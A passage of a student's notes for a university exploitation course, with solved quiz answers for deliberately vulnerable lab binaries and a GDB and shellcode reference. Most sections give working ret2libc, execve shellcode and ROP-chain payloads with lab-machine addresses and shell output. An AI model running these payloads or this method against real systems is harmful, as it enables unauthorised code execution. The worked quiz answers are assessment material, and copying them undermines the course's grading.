chain += p32(gb+0x00) + p32(wr) + p32(0x41414141) + p32(gb+0x09) # ebx = ptr
chain += p32(gb+0x0c) + p32(gb+0x0f) + p32(gb+0x03) + p32(gb+0x12) + p32(gb+0x15)
with open('exploit.4','wb') as f: f.write(str(len(chain)).encode() + b' ' + chain)
```
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.4 exploit.4
# → uid=1000(andre) gid=...
```

---

### 10C. 1048972 SET — Solved (2026-04-02) ✓

> Confirmed `uid=1000` on bins 1–4. bin.0 is a non-exploitable warm-up binary. Environment: WSL2 Ubuntu via PowerShell, `libc6-i386`, `setarch i686 -R --3gb`, `TEMP=1000`.

**Key difference from 10A/10B:** bin.0 has **no file reading** (no display_file, no memcpy) — it just prints argv[1] via `fprintf(stderr, "...%s...", argv[1])`. No overflow is possible. exploit.0 is a dummy file; the binary simply prints a success message. Bins 1–4 use `display_file` with buffer at `ebp-0x34` → **offset = 56** (vs 52 in 10A/10B). Both bin.3 and bin.4 have **identical gadget tables**. Critical: `.bss` is NOT usable as writable region because `0x804a064` stores the TEMP value (1000 = 0x3e8), breaking the null terminator of "/bin//sh". Use `0x07048500` (mmap region, MAP_ANONYMOUS zeroed) for both bin.3 and bin.4.

**Libc addresses (same as all prior sets):**
| Symbol | Address |
|--------|---------|
| `system()` | `0xb7dd58e0` |
| `"/bin/sh"` | `0xb7f42de8` |

**bin.3 and bin.4 gadget tables — IDENTICAL in this set:**
| Offset | Bytes | Gadget |
|--------|-------|--------|
| +0x00 | `58 5b c3` | `pop eax; pop ebx; ret` |
| +0x03 | `31 c0 c3` | `xor eax,eax; ret` |
| +0x06 | `89 03 c3` | `mov [ebx],eax; ret` |
| +0x09 | `89 c3 c3` | `mov %eax,%ebx; ret` |
| +0x0c | `31 c9 c3` | `xor ecx,ecx; ret` |
| +0x0f | `31 d2 c3` | `xor edx,edx; ret` |
| +0x12 | `b0 0b c3` | `mov al,0xb; ret` |
| +0x15 | `cd 80 c3` | `int 0x80; ret` |

**bin.0 — non-exploitable warm-up**
```bash
printf "exploit.0" > exploit.0
# Running confirms: "Congratulations! You have successfully executed bin.0. Your input was: exploit.0"
env -i TEMP=1000 setarch i686 -R --3gb ./bin.0 exploit.0
```

**bin.1 — NX ON → ret2libc (offset=56)**
```python
import struct
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
payload = b'A'*56 + p32(0xb7dd58e0) + p32(0xdeadbeef) + p32(0xb7f42de8)
with open('exploit.1','wb') as f: f.write(b'68 ' + payload)
```
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.1 exploit.1 2>/dev/null
# → uid=1000(andre) gid=...
```

**bin.2 — RWE → shellcode (offset=56, buf=0xbfffe2d4)**
```python
import struct
sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
payload = sc + b'A'*(56-len(sc)) + struct.pack('<I', 0xbfffe2d4)
with open('exploit.2','wb') as f: f.write(b'60 ' + payload)
```
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.2 exploit.2 2>/dev/null
# → uid=1000(andre) gid=...
```

**bin.3 — NX ON → mmap ROP (gb=0x070483e8, wr=0x07048500 — mmap region!)**
```python
import struct
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
gb = 0x070483e8; wr = 0x07048500   # mmap RWX zeroed — NOT .bss (TEMP value at bss+8 breaks null)
chain  = b'A'*56
chain += p32(gb+0x00) + b'/bin' + p32(wr)       + p32(gb+0x06)
chain += p32(gb+0x00) + b'//sh' + p32(wr+4)     + p32(gb+0x06)
chain += p32(gb+0x00) + p32(wr) + p32(0x41414141) + p32(gb+0x09)
chain += p32(gb+0x0c) + p32(gb+0x0f) + p32(gb+0x03) + p32(gb+0x12) + p32(gb+0x15)
with open('exploit.3','wb') as f: f.write(str(len(chain)).encode() + b' ' + chain)
```
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.3 exploit.3 2>/dev/null
# → uid=1000(andre) gid=...
```

**bin.4 — NX ON → mmap ROP + init_data (same as bin.3, wr=0x07048500)**
```python
import struct
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
gb = 0x070483e8; wr = 0x07048500   # .bss unusable (init_data + TEMP value)
chain  = b'A'*56
chain += p32(gb+0x00) + b'/bin' + p32(wr)       + p32(gb+0x06)
chain += p32(gb+0x00) + b'//sh' + p32(wr+4)     + p32(gb+0x06)
chain += p32(gb+0x00) + p32(wr) + p32(0x41414141) + p32(gb+0x09)
chain += p32(gb+0x0c) + p32(gb+0x0f) + p32(gb+0x03) + p32(gb+0x12) + p32(gb+0x15)
with open('exploit.4','wb') as f: f.write(str(len(chain)).encode() + b' ' + chain)
```
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.4 exploit.4 2>/dev/null
# → uid=1000(andre) gid=...
```

---

### 10D. REGINA SET — Solved (2026-04-03) ✓

> Confirmed `uid=1000` on all 4. Environment: WSL2 Ubuntu via PowerShell, `libc6-i386`, `setarch i686 -R --3gb`, `TEMP=1000`.

**Vulnerability (all 4):** `display_file` — `memcpy(local_buf, heap, user_size)`, buffer at `ebp-0x30` → **offset = 52**. No canary.

| Binary | GNU_STACK | Attack |
|--------|-----------|--------|
| bin.1 | RW (NX on) | ret2libc |
| bin.2 | RWE | shellcode, buf=`0xbfffe2e8` |
| bin.3 | RW (NX on) | ret2libc |
| bin.4 | RW (NX on) | ret2libc |

**bin.1, bin.3, bin.4 — ret2libc (offset=52)**
```python
import struct
def p32(v): return struct.pack('<I', v)
payload = b'A'*52 + p32(0xb7dd58e0) + p32(0xdeadbeef) + p32(0xb7f42de8)
with open('exploit.X','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
```

**bin.2 — shellcode (offset=52, buf=`0xbfffe2e8`)**
```python
import struct
sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
payload = sc + b'A'*(52-len(sc)) + struct.pack('<I', 0xbfffe2e8)
with open('exploit.2','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
```

---

### 10E. REGINA 2 SET — Solved (2026-04-03) ✓

> Confirmed `uid=1000` on all 4. Identical vulnerability structure to regina. bin.3 and bin.4 contain extra `memcpy` calls in `main()` — these are **decoys**, not exploitable. Vulnerability is still in `display_file`.

**Key difference from regina:** bin.2 buffer address is `0xbfffe2d8` (0x10 bytes lower than regina's `0xbfffe2e8`).

| Binary | GNU_STACK | Attack |
|--------|-----------|--------|
| bin.1 | RW (NX on) | ret2libc |
| bin.2 | RWE | shellcode, buf=`0xbfffe2d8` |
| bin.3 | RW (NX on) | ret2libc |
| bin.4 | RW (NX on) | ret2libc |

**bin.1, bin.3, bin.4** — same ret2libc payload as regina (offset=52).

**bin.2 — shellcode (offset=52, buf=`0xbfffe2d8`)**
```python
import struct
sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
payload = sc + b'A'*(52-len(sc)) + struct.pack('<I', 0xbfffe2d8)
with open('exploit.2','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
```

---

### 10F. TASOS SET — Solved (2026-04-03) ✓

> Confirmed `uid=1000` on all 4. Identical vulnerability structure to regina/regina2. offset=52, same libc addresses, bin.2 buf=`0xbfffe2d8` (same as regina 2).

| Binary | GNU_STACK | Attack |
|--------|-----------|--------|
| bin.1 | RW (NX on) | ret2libc |
| bin.2 | RWE | shellcode, buf=`0xbfffe2d8` |
| bin.3 | RW (NX on) | ret2libc |
| bin.4 | RW (NX on) | ret2libc |

**All payloads identical to regina 2.** See section 10E.

---

### KEY INSIGHT: The display_file Pattern (regina / regina2 / tasos)

These quiz sets share a common binary template. Once you identify it, no further analysis is needed:

```
Signature: display_file() + memcpy + lea -0x30(%ebp)
→ offset = 52, always
→ bin.1/3/4 = NX on = ret2libc
→ bin.2      = RWE  = shellcode (only variable: buf addr via GDB batch)
→ Ignore extra memcpy calls in main() — they are decoys
```

**Bin.2 buffer addresses observed across sets:**
| Set | buf_addr |
|-----|----------|
| regina | `0xbfffe2e8` |
| regina 2 | `0xbfffe2d8` |
| tasos | `0xbfffe2d8` |

Always confirm via GDB batch — do not assume address matches a previous set.

---

## ⚠️ IMPORTANT: LAST YEAR vs THIS YEAR (2025–2026)

### All sets above (10A–10F) are from LAST YEAR

The solved sets in sections 10A through 10F (out4, 1048972, regina, regina2, tasos) are from the **previous academic year**. Their libc addresses were obtained from **WSL2 Ubuntu** (`libc6-i386`), NOT from the lab machine:

| Symbol | WSL2 address (last year) | Lab machine address (this year) |
|--------|--------------------------|----------------------------------|
| `system()` | `0xb7dd58e0` | `0xb7dffd30` |
| `"/bin/sh"` | `0xb7f42de8` | `0xb7f40caa` |

**These addresses are different.** Never reuse last year's libc addresses for this year's binaries. Always get them fresh from the lab machine via GDB as shown in LLM_INSTRUCTIONS.md.

### This year's quiz pattern (2025–2026): more shellcode bins

Last year: typically 1 RWE bin (bin.2) + rest NX (ret2libc).
This year (lefteris/nektarios): **2 out of 3 bins are RWE shellcode** (bin.2 and bin.3), only bin.1 is NX/ret2libc.

Each bin also has a **different `lea` offset** — do not assume offset=52 like last year. Always read the disassembly.

---

### 10G. LEFTERIS SET — Solved (2026-04-03) ✓

> Confirmed `uid=9992(apieri01)` on all 3 via SSH on lab machine. **Addresses are from lab machine directly.**
> Generated using tailored Python script `solve_lefteris.py` (Tier 1 fast path).

**Classification (bin.0 is PIE warm-up — skip):**

| Binary | GNU_STACK | lea offset | Attack |
|--------|-----------|------------|--------|
| bin.0 | RW, ET_DYN (PIE) | — | Warm-up, skip |
| bin.1 | RW (NX on) | `-0x2a` → offset=**46** | Ret2libc |
| bin.2 | RWE | `-0x2c` → offset=**48** | Shellcode |
| bin.3 | RWE | `-0x28` → offset=**44** | Shellcode |

**Libc addresses — from lab machine (`10.16.13.53`, Rocky Linux i686, TEMP=1000):**
```
system()   = 0xb7dffd30
"/bin/sh"  = 0xb7f40caa
```

**buf_addr — from GDB batch on lab machine (break at `0x804933c`, `p/x $ebp - N`):**
```
bin.2 buf_addr = 0xbfffdbdc   (ebp - 0x2c)
bin.3 buf_addr = 0xbfffdbe0   (ebp - 0x28)
```

**bin.1 — ret2libc (OFFSET=46, 58 bytes)**
```python
import struct
def p32(v): return struct.pack('<I', v)
payload = b'A'*46 + p32(0xb7dffd30) + p32(0xdeadbeef) + p32(0xb7f40caa)
with open('exploit.1','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
```

**bin.2 — shellcode (OFFSET=48, 52 bytes)**
```python
import struct
sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
payload = sc + b'A'*(48-len(sc)) + struct.pack('<I', 0xbfffdbdc)
with open('exploit.2','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
```

**bin.3 — shellcode (OFFSET=44, 48 bytes)**
```python
import struct
sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
payload = sc + b'A'*(44-len(sc)) + struct.pack('<I', 0xbfffdbe0)
with open('exploit.3','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
```

**Verification (lab machine):**
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.X ./exploit.X
```
- `=== BIN 1 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
- `=== BIN 2 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
- `=== BIN 3 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**

---

### 10H. NEKTARIOS SET — Solved (2026-04-03) ✓

> **Identical binaries to lefteris** (same BuildIDs: bin.1=`9d5944c7`, bin.2=`c66c02a8`, bin.3=`f394a776`). All addresses, offsets, and exploit payloads are identical.
> Generated using tailored Python script `solve_nektarios.py` (Tier 1 fast path).

See section 10G for all addresses and payloads — they apply unchanged to the nektarios set.

**Verification (lab machine, same binaries):**
- `=== BIN 1 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
- `=== BIN 2 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
- `=== BIN 3 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**

---

### 10I. KYRIAKI SET — Solved (2026-04-03) ✓

> Confirmed `uid=9992(apieri01)` on all 3 via SSH on lab machine. Addresses are from lab machine directly.
> Generated using tailored Python script `solve_kyriaki.py` (Tier 1 fast path).

**Classification (bin.0 is PIE warm-up — skip):**

| Binary | GNU_STACK | lea offset | Attack |
|--------|-----------|------------|--------|
| bin.0 | ET_DYN (PIE) | — | Warm-up, skip |
| bin.1 | RW (NX on) | `-0x2e` → offset=**50** | Ret2libc |
| bin.2 | RWE | `-0x30` → offset=**52** | Shellcode |
| bin.3 | RWE | `-0x2c` → offset=**48** | Shellcode |

No `mmap`/gadget-building in any `main()`. No stack canaries.

**Libc addresses — from lab machine (`10.16.13.53`, Rocky Linux i686, TEMP=1000):**
```
system()   = 0xb7dffd30
"/bin/sh"  = 0xb7f40caa
```

**buf_addr — from GDB batch on lab machine (break at `0x804933c`, `p/x $ebp - N`):**
```
bin.2 buf_addr = 0xbfffdbd8   (ebp - 0x30)
bin.3 buf_addr = 0xbfffdbdc   (ebp - 0x2c)
```

**bin.1 — ret2libc (OFFSET=50, 62 bytes)**
```python
import struct
def p32(v): return struct.pack('<I', v)
payload = b'A'*50 + p32(0xb7dffd30) + p32(0xdeadbeef) + p32(0xb7f40caa)
with open('exploit.1','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
```

**bin.2 — shellcode (OFFSET=52, 56 bytes)**
```python
import struct
sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
payload = sc + b'A'*(52-len(sc)) + struct.pack('<I', 0xbfffdbd8)
with open('exploit.2','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
```

**bin.3 — shellcode (OFFSET=48, 52 bytes)**
```python
import struct
sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
payload = sc + b'A'*(48-len(sc)) + struct.pack('<I', 0xbfffdbdc)
with open('exploit.3','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
```

**Verification (lab machine):**
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.X ./exploit.X
```
- `=== BIN 1 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
- `=== BIN 2 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**
- `=== BIN 3 ===` `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` → **SUCCESS**

---

### 10J. 2026-G3 SET — Quiz 3 (2026-04-03) — Result: 66/100 ⚠️ MARKING DISPUTE PENDING

> Quiz performed directly on lab machine. bin.2 and bin.3 confirmed working (`uid=9992`).
> bin.1 scored 0 — professor expected `Welcome to the administrator's menu.` output.
> Marking dispute submitted via email (2026-04-21) — awaiting response.

**Classification:**

| Binary | GNU_STACK | lea offset | Attack | Submitted |
|--------|-----------|------------|--------|-----------|
| bin.1 | RW (NX on) | `-0x32` → offset=**54** | Ret2libc (spawns shell) | ✓ works, 0 marks — wrong output expected |
| bin.2 | RWE | `-0x3c` → offset=**60** | Shellcode | ✓ uid=9992 |
| bin.3 | RWE | `-0x32` → offset=**50** | Shellcode | ✓ uid=9992 |

**Libc addresses (lab machine, TEMP=1000):**
```
system()   = 0xb7dffd30
"/bin/sh"  = 0xb7f40caa
```

**What was submitted — printf commands:**
```bash
# bin.1 — ret2libc (works, but professor expected welcome message)
printf "66 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x30\xfd\xdf\xb7\xef\xbe\xad\xde\xaa\x0c\xf4\xb7" > exploit.1
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.1 ./exploit.1
# → uid=9992(apieri01) ✓

# bin.2 — shellcode
printf "64 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xdb\xff\xbf" > exploit.2
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.2 ./exploit.2
# → uid=9992(apieri01) ✓

# bin.3 — shellcode
printf "54 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAA\xda\xdb\xff\xbf" > exploit.3
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.3 ./exploit.3
# → uid=9992(apieri01) ✓
```

**What the correct bin.1 answer was (control-flow redirect to display_root_menu):**
```bash
printf "58 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa7\x93\x04\x08" > exploit.1b
env -i TEMP=1000 setarch i686 -R --3gb ./bin.1 ./exploit.1b
# → Welcome to the administrator's menu.
```
> `exploit.1b` was also created during the quiz session (Apr 3 18:38, 16 min after exploit.1).
> Both files remain on lab machine with original timestamps as evidence.

---

## 11. GENERAL GDB COMMANDS REFERENCE

```bash
# Basics
(gdb) r ARGS                    # run with arguments
(gdb) r `printf "...\xNN"`     # run with binary payload (backticks)
(gdb) b *0xADDR                 # set breakpoint at address
(gdb) b function_name           # set breakpoint at function
(gdb) c                         # continue
(gdb) ni                        # next instruction (step over)
(gdb) si                        # step into
(gdb) q                         # quit

# Inspect registers
(gdb) info registers            # all registers
(gdb) p/x $eip                  # print EIP (current instruction)
(gdb) p/x $esp                  # print stack pointer
(gdb) p/x $ebp                  # print base pointer

# Inspect memory
(gdb) x/32xw $ebp-32           # 32 words (4B each) from ebp-32
(gdb) x/32xb $esp              # 32 bytes from esp
(gdb) x/s 0xADDR               # print as string
(gdb) x/i $eip                 # print current instruction

# Disassembly
(gdb) disas function_name       # disassemble a function
(gdb) disas $eip,+50            # disassemble 50 bytes from current

# Find function/symbol addresses
(gdb) p system                  # print address of system()
(gdb) p &variable               # address of a variable
(gdb) info functions            # list all functions with addresses
(gdb) info sym 0xADDR          # what symbol is at this address

# Find a string in memory
(gdb) find &system, +99999999, "/bin/sh"
```

---

## 12. PYTHON PAYLOAD HELPERS

```python
import struct

# Pack a 32-bit little-endian address
struct.pack('<I', 0x08048574)    # → b'\x74\x85\x04\x08'

# One-liner in bash:
# python3 -c "import struct; print(struct.pack('<I', 0x08048574))" | ...

# Build a shellcode payload (RWE stack):
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
offset    = 56   # replace with your offset
buf       = shellcode + b'A' * (offset - len(shellcode)) + struct.pack('<I', 0xbfffd288)

# Build a ret2libc payload (NX on):
offset  = 52
system  = 0xb7dd58e0
binsh   = 0xb7f42de8
buf     = b'A' * offset + struct.pack('<I', system) + struct.pack('<I', 0xdeadbeef) + struct.pack('<I', binsh)

# Write raw binary for file-reading binary (SIZE header):
payload = buf
with open('exploit', 'wb') as f:
    f.write(str(len(payload)).encode() + b' ' + payload)

# Or pass directly as argument (bash):
# ./binary `python3 -c "import struct; ..."`
```

---

## 13. SHELLCODE REFERENCE

### execve("/bin/sh", NULL, NULL) — 23 bytes, no nulls:
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
```

As assembly (x86, AT&T):
```asm
xor  %eax, %eax
push %eax            # push NULL terminator
push $0x68732f2f     # "//sh"
push $0x6e69622f     # "/bin"
mov  %esp, %ebx      # ebx = ptr to "/bin//sh"
xor  %ecx, %ecx      # ecx = NULL
xor  %edx, %edx      # edx = NULL
mov  $0xb, %al       # eax = 11 (execve syscall)
int  $0x80           # syscall!
```

---

## 14. CHECKLIST FOR EACH QUIZ BINARY

1. `file ./binary` — 32/64-bit? stripped?
2. `readelf -l ./binary | grep GNU_STACK` — NX on or off?
3. `readelf -h ./binary | grep Type` — PIE or not?
4. **Read `main()` fully** — `objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p'`
   - Does it call `mmap()`? → binary may place ROP gadgets at a fixed RWX address
   - Does it write bytes via `movb` into a `malloc`'d buffer? → decode those bytes as x86 instructions, they are your ROP gadgets
   - Formula for mmap base: `(hardcoded_addr / pagesize - 0x1000) * pagesize`
   - Gadgets land at: `mmap_base + offset(TEMP_value)` (with TEMP=1000, offset(1000)=1000)
5. Find the vulnerable function (look for `strcpy`, `memcpy`, `printf(s)`, `gets`)
6. Set breakpoint **after** the dangerous call
7. Run with pattern input → read stack → find offset to return address
8. **Decide attack:**
   - NX off (RWE) → **shellcode injection** (Section 4)
   - NX on, ASLR off → **ret2libc first** (Section 5) — just needs `p system` + `find /bin/sh`
   - NX on, no system/libc → **ROP chain** (Section 6) — find gadgets with objdump/ROPgadget
   - `printf(user_input)` → **format string** (Section 7)
   - C++ delete+malloc+virtual → **UAF vtable hijack** (Section 8)
9. Find target address (buffer start for shellcode, or libc addresses for ret2libc)
10. Craft payload in Python, write to file, test with `echo 'id' | run.sh ./binary exploit`
